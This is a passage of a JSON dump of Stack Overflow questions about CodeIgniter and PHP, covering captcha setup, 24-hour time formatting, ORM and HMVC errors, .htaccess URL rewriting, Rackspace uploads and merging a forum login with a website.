pass the all the db <code>data</code> to the <code>foreach</code> what am I doing wrong?  </p>\n"},{"tags":["php","flash","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":70,"score":0,"question_id":12812321,"title":"How to combine Flash ActionScript with PHP?","body":"<p>I am new to using flash and I need to make a web application using CodeIgniter with PHP.</p>\n\n<p>I have some doubts about the MVC pattern applied in codeigniter.\nI'll use ActionScript because I see that is most used and less complex. (correct me if I'm wrong)</p>\n\n<p>Are my views (which are in the folder view) would separate my files in Flash?\nAny IDE assist me in programming flash with php?\nShould I create a separate Flash application from another application to connect php?\nAny consideration to be taken into account?</p>\n\n<p>Thanks in advance.</p>\n"},{"tags":["php","codeigniter","ssl","https"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":53,"score":0,"question_id":12809561,"title":"Codeigniter SSL / HTTPS what are my options, multiple sub domains in play.","body":"<p>Recently installed a SSL Cert on our server/domain, and I am realizing now that CI doesn't like <code>https://</code> seems like anything that works <code>http://</code> gets a 404 in <code>https://</code> so but I have some views/controllers that don't require the whole <code>https://</code> bit. Such as pages when a user is not logged in to the service I am building up, that are viewable. Only thing I have come up with is configuring the base_url in config.php, which won't work that well for me either, as we have multiple environments where the service runs through before it reaches a public viewable area.</p>\n\n<p>By that I mean we have our dev area where each one of our devs has a separate sub domain with there current dev stack, working on what they are working on. Then we have a staging and QA area, as well as a beta area all before it will reach production.</p>\n\n<p>So I am looking for ideas on how to handle all of this, and short of the base_url config I have no idea where to begin to make this an easy to manage solution. </p>\n"},{"tags":["php","mysql","codeigniter","time","unix-time"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":71,"score":0,"question_id":12846927,"title":"Why can't I convert my 24 hour time to a 12 hour am/pm time with PHP?","body":"<p>I'm using Codeigniter and i'm having an issue where my 24 hour time column in a MySQL table is pulled by ActiveRecord &amp; simply refuses to convert to a proper am/pm time.  </p>\n\n<p>In my DB table, I have a time stored as 22:00:00 (10:00 PM).  When I pull the value from the database, the raw Unix time appears to be 1349960400 (which doesn't appear to be correct in itself) and when I run it through the date &amp; strttotime functions it comes out as 22:00 PM.</p>\n\n<p>This is what my code looks like:</p>\n\n<pre><code>function get_events_by_day($year, $month, $day)\n{           \n    $events = array();\n    $query = $this-&gt;db-&gt;select('*')\n                        -&gt;from('calendar_events')\n                        -&gt;where('EventDate', \"$year-$month-$day\", 'after')\n                        -&gt;get();\n\n    $events = $query-&gt;result(); \n\n    foreach($events as $event)\n    {\n        debug($event-&gt;EventStartTime); // prints 1349960400\n        debug(strtotime($event-&gt;EventStartTime)); // prints 22:00\n        $event-&gt;EventStartTime = date(\"H:i A\", strtotime($event-&gt;EventStartTime));\n        $event-&gt;EventEndTime = date(\"H:i A\", strtotime($event-&gt;EventEndTime));\n        debug($event-&gt;EventEndTime); // prints 22:00 PM\n    }           \n\n    return $events;\n}\n</code></pre>\n\n<p>Any thoughts would be greatly appreciated.</p>\n"},{"tags":["php","codeigniter","relationship","has-many","belongs-to"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":61,"score":0,"question_id":12839037,"title":"Using Relationship in Jamie Rumbelow MY_model","body":"<p>I am using MY_model as is <a href=\"https://github.com/jamierumbelow/codeigniter-base-model\" rel=\"nofollow\">Codeigniter-base-model</a>. I am unable to get the basic relationship working. I searched a lot but could find solution.</p>\n\n<hr>\n\n<p>To start with I have 2 classes item_model.php &amp; user_model.php both extend MY_Model.</p>\n\n<p>In item_model class I have defined </p>\n\n<p><code>public $belongs_to = array( 'user' =&gt; array( 'model' =&gt; 'user_model') );</code></p>\n\n<p>and in the user_model\n<code>public $has_many = array( 'items' =&gt; array( 'model' =&gt; 'item_model') );</code></p>\n\n<p>Now, in the controller when I call </p>\n\n<p><code>$item_details = $this-&gt;item_model-&gt;with('user')-&gt;find_by_id($item_id);</code></p>\n\n<p>I am getting the correct data for <code>$item_details</code> but I am unable to get information from the 'user' relationship.  <code>$item_details-&gt;user_id-&gt;username;</code>.</p>\n\n<p>I am getting following error <code>Message: Trying to get property of non-object</code></p>\n\n<p>Table are standard </p>\n\n<p>users table has id, username, ...\nitem table has id, user_id, title...</p>\n\n<p>user_id is is setUp as FK to users.id.</p>\n\n<p>Please help.</p>\n"},{"tags":["codeigniter","captcha"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":3641,"score":0,"question_id":1504514,"title":"How to Use Captcha Plugin in CodeIgniter ","body":"<p>I followed this <a href=\"http://codeigniter.com/wiki/captcha/\" rel=\"nofollow\">page</a>, and the code is not working as it should in my project. I've tried to find other tutorial on how to execute what I need, however, it does not work as it should in my project either. Is anyone able to direct me to a tutorial that explains in a detailed fashion on how to use Captcha plug-in properly in CodeIgniter? </p>\n\n<p><strong>Controller</strong>:</p>\n\n<pre><code>&lt;?php\nclass Prova extends Controller\n{\n    function prova()\n    {\n        parent :: Controller(); \n\n         $this -&gt; load -&gt; plugin( 'captcha' ); \n\n        $this-&gt;load-&gt;library('validation');\n        $rules['user']    = \"required\";\n        $rules['captcha']    = \"required|callback_captcha_check\";\n        $this-&gt;validation-&gt;set_rules($rules);\n\n        $fields['user']    = 'Username';\n        $fields['captcha']    = 'codice';\n        $this-&gt;validation-&gt;set_fields($fields);\n        if ($this-&gt;validation-&gt;run() == FALSE)\n        {\n            $expiration = time()-300; // Two hour limit\n            $this-&gt;db-&gt;query(\"DELETE FROM captcha WHERE captcha_time &lt; \".$expiration);\n            $vals = array(\n                        //'word'         =&gt; 'Random word',\n                        'img_path'     =&gt; './tmp/captcha/',\n                        'img_url'     =&gt; base_url().'tmp/captcha/',\n                        'font_path'     =&gt; './system/fonts/texb.ttf',\n                        'img_width'     =&gt; '100',\n                        'img_height' =&gt; '30',\n                        'expiration' =&gt; '3600'\n                    );\n\n            $cap = $this-&gt;captcha-&gt;create_captcha($vals);\n            //\n            $dati['image']= $cap['image'];\n            //mette nel db\n            $data = array(\n                        'captcha_id'    =&gt; '',\n                        'captcha_time'    =&gt; $cap['time'],\n                        'ip_address'    =&gt; $this-&gt;input-&gt;ip_address(),\n                        'word'            =&gt; $cap['word']\n                    );\n\n            $query = $this-&gt;db-&gt;insert_string('captcha', $data);\n            $this-&gt;db-&gt;query($query);\n            $this-&gt;load-&gt;view('captcha',$data);\n        }else{\n            echo \"Captcha can't be made\";\n        }\n        return $cap ['image'];\n    }\n\n    function captcha_check()\n    {\n            // Then see if a captcha exists:\n            $exp=time()-600;\n            $sql = \"SELECT COUNT(*) AS count FROM captcha WHERE word = ? AND ip_address = ? AND captcha_time &gt; ?\";\n            $binds = array($this-&gt;input-&gt;post('captcha'), $this-&gt;input-&gt;ip_address(), $exp);\n            $query = $this-&gt;db-&gt;query($sql, $binds);\n            $row = $query-&gt;row();\n\n            if ($row-&gt;count == 0)\n            {\n                $this-&gt;validation-&gt;set_message('_captcha_check', 'Codice di controllo non valido');\n                return FALSE;\n            }else{\n                return TRUE;\n            }\n\n    }\n}\n</code></pre>\n\n<p><strong>View</strong>:</p>\n\n<pre><code>&lt;html&gt;\n&lt;head&gt;\n&lt;title&gt;My Form&lt;/title&gt;\n\n&lt;/head&gt;\n&lt;body&gt;\n\n&lt;?=$this-&gt;validation-&gt;error_string; ?&gt;\n\n&lt;?=form_open('XXXXXXXXX type your controller'); ?&gt;\n\n&lt;h5&gt;Username&lt;/h5&gt;\n&lt;?=$this-&gt;validation-&gt;user_error; ?&gt;\n&lt;input type=\"text\" name=\"user\" value=\"&lt;?php echo ($this-&gt;validation-&gt;user) ;?&gt;\"  size=\"50\" /&gt;\n&lt;br/&gt;\n&lt;?=$image;?&gt;\n&lt;br/&gt;\n&lt;?=$this-&gt;validation-&gt;captcha_error; ?&gt;\n&lt;input type=\"text\" name=\"captcha\" value=\"\" /&gt;\n&lt;br/&gt;\n&lt;div&gt;&lt;input type=\"submit\" value=\"Submit\" /&gt;&lt;/div&gt;\n\n&lt;/form&gt;\n\n&lt;/body&gt;\n&lt;/html&gt; \n</code></pre>\n\n<p><strong>Captcha</strong>:</p>\n\n<pre><code>&lt;?php  if ( ! defined('BASEPATH')) exit('No direct script access allowed');\n/**\n * CodeIgniter\n *\n * An open source application development framework for PHP 4.3.2 or newer\n *\n * @package     CodeIgniter\n * @author      ExpressionEngine Dev Team\n * @copyright   Copyright (c) 2008, EllisLab, Inc.\n * @license     http://codeigniter.com/user_guide/license.html\n * @link        http://codeigniter.com\n * @since       Version 1.0\n * @filesource\n */\n\n// ------------------------------------------------------------------------\n\n/*\nInstructions:\n\nLoad the plugin using:\n\n    $this-&gt;load-&gt;plugin('captcha');\n\nOnce loaded you can generate a captcha like this:\n\n    $vals = array(\n                    'word'       =&gt; 'Random word',\n                    'img_path'   =&gt; './captcha/',\n                    'img_url'    =&gt; 'http://example.com/captcha/',\n                    'font_path'  =&gt; './system/fonts/texb.ttf',\n                    'img_width'  =&gt; '150',\n                    'img_height' =&gt; 30,\n                    'expiration' =&gt; 7200\n                );\n\n    $cap = create_captcha($vals);\n    echo $cap['image'];\n\n\nNOTES:\n\n    The captcha function requires the GD image library.\n\n    Only the img_path and img_url are required.\n\n    If a \"word\" is not supplied, the function will generate a random\n    ASCII string.  You might put together your own word library that\n    you can draw randomly from.\n\n    If you do not specify a path to a TRUE TYPE font, the native ugly GD\n    font will be used.\n\n    The \"captcha\" folder must be writable (666, or 777)\n\n    The \"expiration\" (in seconds) signifies how long an image will\n    remain in the captcha folder before it will be deleted.  The default\n    is two hours.\n\nRETURNED DATA\n\nThe create_captcha() function returns an associative array with this data:\n\n  [array]\n  (\n    'image' =&gt; IMAGE TAG\n    'time'  =&gt; TIMESTAMP (in microtime)\n    'word'  =&gt; CAPTCHA WORD\n  )\n\nThe \"image\" is the actual image tag:\n&lt;img src=\"http://example.com/captcha/12345.jpg\" width=\"140\" height=\"50\" /&gt;\n\nThe \"time\" is the micro timestamp used as the image name without the file\nextension.  It will be a number like this:  1139612155.3422\n\nThe \"word\" is the word that appears in the captcha image, which if not\nsupplied to the function, will be a random string.\n\n\nADDING A DATABASE\n\nIn order for the captcha function to prevent someone from posting, you will need\nto add the information returned from create_captcha() function to your database.\nThen, when the data from the form is submitted by the user you will need to verify\nthat the data exists in the database and has not expired.\n\nHere is a table prototype:\n\n    CREATE TABLE captcha (\n     captcha_id bigint(13) unsigned NOT NULL auto_increment,\n     captcha_time int(10) unsigned NOT NULL,\n     ip_address varchar(16) default '0' NOT NULL,\n     word varchar(20) NOT NULL,\n     PRIMARY KEY `captcha_id` (`captcha_id`),\n     KEY `word` (`word`)\n    )\n\n\nHere is an example of usage with a DB.\n\nOn the page where the captcha will be shown you'll have something like this:\n\n    $this-&gt;load-&gt;plugin('captcha');\n    $vals = array(\n                    'img_path'   =&gt; './captcha/',\n                    'img_url'    =&gt; 'http://example.com/captcha/'\n                );\n\n    $cap = create_captcha($vals);\n\n    $data = array(\n                    'captcha_id'    =&gt; '',\n                    'captcha_time'  =&gt; $cap['time'],\n                    'ip_address'    =&gt; $this-&gt;input-&gt;ip_address(),\n                    'word'          =&gt; $cap['word']\n                );\n\n    $query = $this-&gt;db-&gt;insert_string('captcha', $data);\n    $this-&gt;db-&gt;query($query);\n\n    echo 'Submit the word you see below:';\n    echo $cap['image'];\n    echo '&lt;input type=\"text\" name=\"captcha\" value=\"\" /&gt;';\n\n\nThen, on the page that accepts the submission you'll have something like this:\n\n    // First, delete old captchas\n    $expiration = time()-7200; // Two hour limit\n    $DB-&gt;query(\"DELETE FROM captcha WHERE captcha_time &lt; \".$expiration);        \n\n    // Then see if a captcha exists:\n    $sql = \"SELECT COUNT(*) AS count FROM captcha WHERE word = ? AND ip_address = ? AND date &gt; ?\";\n    $binds = array($_POST['captcha'], $this-&gt;input-&gt;ip_address(), $expiration);\n    $query = $this-&gt;db-&gt;query($sql, $binds);\n    $row = $query-&gt;row();\n\n    if ($row-&gt;count == 0)\n    {\n        echo \"You must submit the word that appears in the image\";\n    }\n\n*/\n\n\n\n/**\n|==========================================================\n| Create Captcha\n|==========================================================\n|\n*/\nfunction create_captcha($data = '', $img_path = '', $img_url = '', $font_path = '')\n{       \n    $defaults = array('word' =&gt; '', 'img_path' =&gt; '', 'img_url' =&gt; '', 'img_width' =&gt; '150', 'img_height' =&gt; '30', 'font_path' =&gt; '', 'expiration' =&gt; 7200);        \n\n    foreach ($defaults as $key =&gt; $val)\n    {\n        if ( ! is_array($data))\n        {\n            if ( ! isset($$key) OR $$key == '')\n            {\n                $$key = $val;\n            }\n        }\n        else\n        {           \n            $$key = ( ! isset($data[$key])) ? $val : $data[$key];\n        }\n    }\n\n    if ($img_path == '' OR $img_url == '')\n    {\n        return FALSE;\n    }\n\n    if ( ! @is_dir($img_path))\n    {\n        return FALSE;\n    }\n\n    if ( ! is_really_writable($img_path))\n    {\n        return FALSE;\n    }\n\n    if ( ! extension_loaded('gd'))\n    {\n        return FALSE;\n    }       \n\n    // -----------------------------------\n    // Remove old images    \n    // -----------------------------------\n\n    list($usec, $sec) = explode(\" \", microtime());\n    $now = ((float)$usec + (float)$sec);\n\n    $current_dir = @opendir($img_path);\n\n    while($filename = @readdir($current_dir))\n    {\n        if ($filename != \".\" and $filename != \"..\" and $filename != \"index.html\")\n        {\n            $name = str_replace(\".jpg\", \"\", $filename);\n\n            if (($name + $expiration) &lt; $now)\n            {\n                @unlink($img_path.$filename);\n            }\n        }\n    }\n\n    @closedir($current_dir);\n\n    // -----------------------------------\n    // Do we have a \"word\" yet?\n    // -----------------------------------\n\n   if ($word == '')\n   {\n        $pool = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';\n\n        $str = '';\n        for ($i = 0; $i &lt; 8; $i++)\n        {\n            $str .= substr($pool, mt_rand(0, strlen($pool) -1), 1);\n        }\n\n        $word = $str;\n   }\n\n    // -----------------------------------\n    // Determine angle and position \n    // -----------------------------------\n\n    $length = strlen($word);\n    $angle  = ($length &gt;= 6) ? rand(-($length-6), ($length-6)) : 0;\n    $x_axis = rand(6, (360/$length)-16);            \n    $y_axis = ($angle &gt;= 0 ) ? rand($img_height, $img_width) : rand(6, $img_height);\n\n    // -----------------------------------\n    // Create image\n    // -----------------------------------\n\n    // PHP.net recommends imagecreatetruecolor(), but it isn't always available\n    if (function_exists('imagecreatetruecolor'))\n    {\n        $im = imagecreatetruecolor($img_width, $img_height);\n    }\n    else\n    {\n        $im = imagecreate($img_width, $img_height);\n    }\n\n    // -----------------------------------\n    //  Assign colors\n    // -----------------------------------\n\n    $bg_color       = imagecolorallocate ($im, 255, 255, 255);\n    $border_color   = imagecolorallocate ($im, 153, 102, 102);\n    $text_color     = imagecolorallocate ($im, 204, 153, 153);\n    $grid_color     = imagecolorallocate($im, 255, 182, 182);\n    $shadow_color   = imagecolorallocate($im, 255, 240, 240);\n\n    // -----------------------------------\n    //  Create the rectangle\n    // -----------------------------------\n\n    ImageFilledRectangle($im, 0, 0, $img_width, $img_height, $bg_color);\n\n    // -----------------------------------\n    //  Create the spiral pattern\n    // -----------------------------------\n\n    $theta      = 1;\n    $thetac     = 7;\n    $radius     = 16;\n    $circles    = 20;\n    $points     = 32;\n\n    for ($i = 0; $i &lt; ($circles * $points) - 1; $i++)\n    {\n        $theta = $theta + $thetac;\n        $rad = $radius * ($i / $points );\n        $x = ($rad * cos($theta)) + $x_axis;\n        $y = ($rad * sin($theta)) + $y_axis;\n        $theta = $theta + $thetac;\n        $rad1 = $radius * (($i + 1) / $points);\n        $x1 = ($rad1 * cos($theta)) + $x_axis;\n        $y1 = ($rad1 * sin($theta )) + $y_axis;\n        imageline($im, $x, $y, $x1, $y1, $grid_color);\n        $theta = $theta - $thetac;\n    }\n\n    // -----------------------------------\n    //  Write the text\n    // -----------------------------------\n\n    $use_font = ($font_path != '' AND file_exists($font_path) AND function_exists('imagettftext')) ? TRUE : FALSE;\n\n    if ($use_font == FALSE)\n    {\n        $font_size = 5;\n        $x = rand(0, $img_width/($length/3));\n        $y = 0;\n    }\n    else\n    {\n        $font_size  = 16;\n        $x = rand(0, $img_width/($length/1.5));\n        $y = $font_size+2;\n    }\n\n    for ($i = 0; $i &lt; strlen($word); $i++)\n    {\n        if ($use_font == FALSE)\n        {\n            $y = rand(0 , $img_height/2);\n            imagestring($im, $font_size, $x, $y, substr($word, $i, 1), $text_color);\n            $x += ($font_size*2);\n        }\n        else\n        {       \n            $y = rand($img_height/2, $img_height-3);\n            imagettftext($im, $font_size, $angle, $x, $y, $text_color, $font_path, substr($word, $i, 1));\n            $x += $font_size;\n        }\n    }\n\n\n    // -----------------------------------\n    //  Create the border\n    // -----------------------------------\n\n    imagerectangle($im, 0, 0, $img_width-1, $img_height-1, $border_color);      \n\n    // -----------------------------------\n    //  Generate the image\n    // -----------------------------------\n\n    $img_name = $now.'.jpg';\n\n    ImageJPEG($im, $img_path.$img_name);\n\n    $img = \"&lt;img src=\\\"$img_url$img_name\\\" width=\\\"$img_width\\\" height=\\\"$img_height\\\" style=\\\"border:0;\\\" alt=\\\" \\\" /&gt;\";\n\n    ImageDestroy($im);\n\n    return array('word' =&gt; $word, 'time' =&gt; $now, 'image' =&gt; $img);\n}\n\n\n/* End of file captcha_pi.php */\n/* Location: ./system/plugins/captcha_pi.php */\n</code></pre>\n"},{"tags":["php","codeigniter","rackspace-cloud"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":69,"score":3,"question_id":12845616,"title":"uploading photos to server/rackspace cloudfiles - php/codeigniter","body":"<p>I'm working on uploading photos from my computer to the server, using this <a href=\"https://bitbucket.org/modomg/codeigniter-rackspace-cloudfiles\" rel=\"nofollow\">repository</a>. When I try to upload a file called mylogo.jpg, I get an error that says:</p>\n\n<p><strong>Could not open file for reading: /tmp/php0d4X5Ny/mylogo.jpg</strong></p>\n\n<p>I need to figure out why I'm getting this error.</p>\n\n<p>Here's my code from the <strong>controller</strong> (cloudfiles.php):</p>\n\n<pre><code>        public function add_local_file()\n        {\n                $file_location = $_FILES['userfile']['tmp_name'].'/';\n                $file_name = $_FILES['userfile']['name'];\n\n                $this-&gt;cfiles-&gt;do_object('a', $file_name, $file_location);\n\n                $this-&gt;_show_errors('Image Added!');\n        }\n</code></pre>\n\n<p>The <a href=\"https://bitbucket.org/modomg/codeigniter-rackspace-cloudfiles/src/94aca4a67aa3ed8d5f4f92d1fd104574fab22e76/application/libraries/cf/cfiles.php?at=default\" rel=\"nofollow\">do_object function is here</a> (line 151). And here is the upload <strong>view</strong>:</p>\n\n<pre><code>&lt;?php echo form_open_multipart('cloudfiles/add_local_file'); ?&gt;\n\n&lt;input type=\"file\" name=\"userfile\" size=\"20\" /&gt;\n\n&lt;input type=\"submit\" value=\"upload\" /&gt;\n\n&lt;?php echo form_close(); ?&gt;\n</code></pre>\n\n<p>I searched the cloudfiles library and found that the \"could not open file for reading\" error is an exception in this function:</p>\n\n<pre><code>function load_from_filename($filename, $verify=true)\n    {\n        $fp = @fopen($filename, \"r\");\n        if (!$fp) {\n            throw new IOException(\"Could not open file for reading: \".$filename);\n        }\n\n        clearstatcache();\n\n        $size = (float) sprintf(\"%u\", filesize($filename));\n        if ($size &gt; MAX_OBJECT_SIZE) {\n            throw new SyntaxException(\"File size exceeds maximum object size.\");\n        }\n\n        $this-&gt;_guess_content_type($filename);\n\n        $this-&gt;write($fp, $size, $verify);\n        fclose($fp);\n        return True;\n    }\n</code></pre>\n\n<p>I've been looking at this for several hours and can't see what's going wrong. Not seeing any php errors, by the way, just the one error noted above. New to Stack Overflow (frequent browser, new account), so thanks in advance for your help.</p>\n"},{"tags":["php","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":71,"score":0,"question_id":12841415,"title":"PHP error- Undefined property: stdClass - How to fix w/ a bunch of objects?","body":"<p>I am getting an  Undefined property: stdClass::$company error.</p>\n\n<p>This fixes it </p>\n\n<pre><code>   if(isset($exp-&gt;company){\n       /stuff here\n      }\n</code></pre>\n\n<p>but I have a bunch of objects so I would have to that for each. Is there a cleaner way to fix this?</p>\n\n<p>here is the entire thing</p>\n\n<pre><code>   function test() {\n foreach($_POST['experience'] as $experience)\n    {\n\n       $exp=(object)$experience;\n\n    }\n\n             }\n</code></pre>\n"},{"tags":[".htaccess","codeigniter"],"answer_count":7,"favorite_count":10,"up_vote_count":7,"down_vote_count":0,"view_count":16914,"score":7,"question_id":1397014,"title":"How do I write a .htaccess file to make CodeIgniters URL routing work?","body":"<p>I'm running a LAMP environment with CodeIgniter. I want to be able to use its URL pattern, like, <code>http://localhost/controller/function/ID</code>, but by default it has to be <code>http://localhost/index.php/controller/function/ID</code>. The user guide says that I need a .htaccess file to make the former style possible, and uses this as an example:</p>\n\n<pre><code>RewriteEngine on\nRewriteCond $1 !^(index\\.php|images|robots\\.txt)\nRewriteRule ^(.*)$ /index.php/$1 [L]\n</code></pre>\n\n<p>But I don't understand how this works. Where should I put the .htaccess? Does it have to be in the server root?</p>\n\n<p>What if I have multiple sites running on my server. Do I have to put it in <code>/var/www/</code> and specify conditions based on what directories are loaded? Or can I just put it in <code>/var/www/site_using_codeigniter/</code>? I'm not sure how to even get this to work.</p>\n\n<p>Can I make it so that it will only map to an MVC URL if the requested URL doesn't actually exist? For example, <code>http://localhost/articles/2009/some-article-name</code> wouldn't be a directory on the server, so it would map to <code>index.php</code> and be given to codeigniter, but <code>http://localhost/forum</code> <em>would</em> exist on the server but shouldn't be handled by codeigniter.</p>\n\n<p>Any other things I should do with a .htaccess file? Anything good to read about them?</p>\n\n<h2>update</h2>\n\n<p>I changed my config file like this:</p>\n\n<pre><code>$config['index_page'] = \"\"; //used to be \"index.php\"\n</code></pre>\n\n<p>and added this to a <code>.htaccess</code> file:</p>\n\n<pre><code>RewriteEngine on\nRewriteCond $1 !^(index\\.php|images|robots\\.txt)\nRewriteRule ^(.*)$ /index.php/$1 [L]\n</code></pre>\n\n<p>and saved it in my sites root directory (in this case <code>/var/www/cms/</code>)</p>\n\n<p>I went into /etc/apache2/conf.d/security (which is included by /etc/apache2/apache2.conf) and did this:</p>\n\n<pre><code>&lt;Directory /&gt;\n    AllowOverride All #was \"none\", but this was all commented out\n    Order Deny,Allow\n    Deny from all\n&lt;/Directory&gt;\n</code></pre>\n\n<p>It's still not working however. If I navigate to <code>http://localhost/cms/index.php/hello</code>, it prints \"Hello there,\" but <code>http://localhost/cms/hello</code> gives a 404 error.</p>\n\n<p>Ideas?</p>\n\n<h2>update: græt success!</h2>\n\n<p>I had to dig through my apache configuration files to finally find where all the directories were defined (I had never messed around in server config files before this date) and found that pesky <code>AllowOverride None</code> that was foiling my plans for greatness.</p>\n\n<p>Now it works perfectly. All of the answers here are viable and work.</p>\n"},{"tags":["php","codeigniter","foreach"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":74,"score":0,"question_id":12839906,"title":"undefined variable Codeigniter and invalid argument supplied foreach read database","body":"<p>I was following the <a href=\"http://www.papatlimo.com/2011/09/simple-crud-with-codeigniter.html\" rel=\"nofollow\">instruction</a> to get the entire record from table, and load them into html table. this is the model</p>\n\n<pre><code>private $namatabel;\n\npublic function __construct() {\n    parent::__construct();\n    $namatabel='ms_kategori_material';\n}\n\nfunction read()\n{        \n   $sql = $this-&gt;db-&gt;get($this-&gt;namatabel);  \n\n   if($sql-&gt;num_rows() &gt; 0)\n    {     \n        foreach($sql-&gt;result() as $row)\n        {  \n            $data[] = $row;  \n        }     \n        return $data;  \n    } \n    else \n    {  \n        return null;  \n    }  \n\n}\n</code></pre>\n\n<p>then use the <code>read()</code> function on controller</p>\n\n<pre><code>public function __construct() {\n    parent::__construct();\n    $this-&gt;load-&gt;model('m_kategorimaterial');\n}\n\nfunction index()\n{\n    $data['c_row'] = $this-&gt;m_kategorimaterial-&gt;read();\n//pass the c_row into the views  \n    $this-&gt;load-&gt;view('v/vkategorimaterial', $data);  \n}\n</code></pre>\n\n<p>to display them on the views</p>\n\n<pre><code>&lt;?php  \n$no = 1;   \nforeach ($c_row as $row) { ?&gt;  \n    &lt;tr id=\"row\"&gt;  \n        &lt;td id=\"no\"&gt;&lt;?php echo $no;?&gt;&lt;/td&gt;  \n        &lt;td id=\"judul\"&gt;&lt;?php echo $row-&gt;Kode_Kategori_Material_Jasa;?&gt;&lt;/td&gt;  \n        &lt;td id=\"kategori\"&gt;&lt;?php echo $row-&gt;Nama_Material_Jasa;?&gt;&lt;/td&gt;                 \n    &lt;/tr&gt;  \n&lt;?php  \n    $no++;  \n}  \n?&gt;  \n</code></pre>\n\n<p>but then I got an error saying, undefined variable <code>c_row</code> and invalid argument supplied <code>foreach()</code>. I thought I have sent the <code>c_row</code> variable through the <code>c_kategorimaterial/index</code> and copy pasting <code>foreach</code> statement. what went wrong ? </p>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":54,"score":0,"question_id":12841453,"title":"backend and frontend for forum codeigniter","body":"<p>I am building a forum using codeIgniter. I need to have 3 viewers; Admin, registered users and public.</p>\n\n<p>I know we need to have backend and frontend. I don't know how to start..\nI tried to read from Phil's blog, using sub-directories but i still don't get it. </p>\n"},{"tags":["php","codeigniter","login","smf-forum"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":12843599,"title":"Simple Machines Forums merge login with website","body":"<p>So i want my users to only register and login once. I already have the registration part working and they can manually login to the forum but i want to merge my login for website and forum.</p>\n\n<p>My website users will have same userid as forum users and same password encryption sha1( lowercase(username) + password ).</p>\n\n<p>How can i use $_COOKIE[]... to create a SMF login cookie so that when they click on Forum they are redirected to the forum and already logged in.</p>\n\n<p>Thanks for all the help in advance.</p>\n\n<p>Website will have about 10 users so a very very crude and simple option will do.</p>\n\n<blockquote>\n  <p>I have tried following this tutorial\n  <a href=\"http://www.html-form-guide.com/php-form/php-form-submit.html\" rel=\"nofollow\">http://www.html-form-guide.com/php-form/php-form-submit.html</a> to have\n  my Codeigniter application fill that login form and post it but no\n  succsses.</p>\n</blockquote>\n"},{"tags":["codeigniter","orm","datamapper"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":48,"score":1,"question_id":12442884,"title":"datamapper orm on codeigniter doesn't work","body":"<p>Good day to all. I am trying DATAMAPPER ORM (wan wizard) on Codeigniter. Example aplication works fine. But when I try make my own models and controllers it doesn't work. I did every step in the instruction. Here is a code:</p>\n\n<pre><code>class Blog extends DataMapper {\n\nvar $has_one = array();\nvar $has_many = array();\nvar $validation = array(\n    'content' =&gt; array(\n        // example is required, and cannot be more than 120 characters long.\n        'rules' =&gt; array('required', 'max_length' =&gt; 255),\n        'label' =&gt; 'Content'\n    )\n);\nfunction __construct($id = NULL)\n{\n    parent::__construct($id);\n}\n\n}\n</code></pre>\n\n<p>I created table in db (blog with one row called content).</p>\n\n<p>And here is a controller:</p>\n\n<pre><code>class Blog extends CI_Controller {\n\n    function __construct()\n    {\n        parent::__construct();\n    }\n\n    public function index()\n    {\n        $blog = new Blog;\n        $blog-&gt;content = \"shaa\";\n        $blog-&gt;save();\n        echo \"done\";\n    }\n\n}\n</code></pre>\n\n<p>But it always gives me an error: <code>Fatal error: Call to undefined method Blog::save() in C:\\xampp\\htdocs\\wanwizarddatamapper\\application\\controllers\\blog.php on line 29</code></p>\n\n<p>Uuhh it's depresing me! Can you help me? Thank you</p>\n"},{"tags":["git","codeigniter","github"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":43,"score":1,"question_id":12795611,"title":"Git: How to add a remote, merged in a sub folder of a master repository?","body":"<p>I've cloned the codeigniter repository <a href=\"https://github.com/EllisLab/CodeIgniter\" rel=\"nofollow\">https://github.com/EllisLab/CodeIgniter</a>, which in particular creates the application and system folders.</p>\n\n<p>The application folder has sub-folders, libraries and third-party, which are of interest right now.</p>\n\n<p>I'd like to clone this repository : <a href=\"https://github.com/iamfiscus/Codeigniter-DOMPDF\" rel=\"nofollow\">https://github.com/iamfiscus/Codeigniter-DOMPDF</a> which has in its own root the libraries and third-party folders.</p>\n\n<p>Is there a way to add a new remote to Codeigniter-DOMPDF in my codeigniter repository, which would copy the files and folders in the correct places?</p>\n\n<p>Thanks in advance</p>\n"},{"tags":["codeigniter","hmvc","mx"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":87,"score":0,"question_id":12837475,"title":"Codeigniter HMVC Modular Error","body":"<p>I'm new to CI + MX and I tried the Modules::run(); style but I can't seem to let it work.</p>\n\n<p>Here's my directory structure:</p>\n\n<pre><code>/application\n-/modules\n--/main\n---/controllers\n----main.php\n---/models\n---/views\n--/connections\n---/controllers\n----connections.php\n---/models\n----/group_model.php\n---/views\n----connection_view.php\n</code></pre>\n\n<p>main.php controller:</p>\n\n<pre><code>&lt;?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');\nclass Main extends MX_Controller {\nfunction __construct(){\n    parent::__construct();  \n    $this-&gt;load-&gt;helper('url');\n\n}\nfunction index(){\n    echo modules::run('connections/load_connections');      \n}\n}\n?&gt;\n</code></pre>\n\n<p>connections.php controller:</p>\n\n<pre><code>&lt;?php\nclass Connections extends CI_Controller{\n\nfunction __construct(){\n    parent::__construct();  \n    $this-&gt;load-&gt;helper('url');\n\n    $this-&gt;load-&gt;model('connections/group_model');\n}\n\nfunction load_connections(){\n    $user_id = 2;           \n    $data['tabs'] = $this-&gt;group_model-&gt;get_groups($user_id);                                       \n    $this-&gt;load-&gt;view('connection_view', $data);        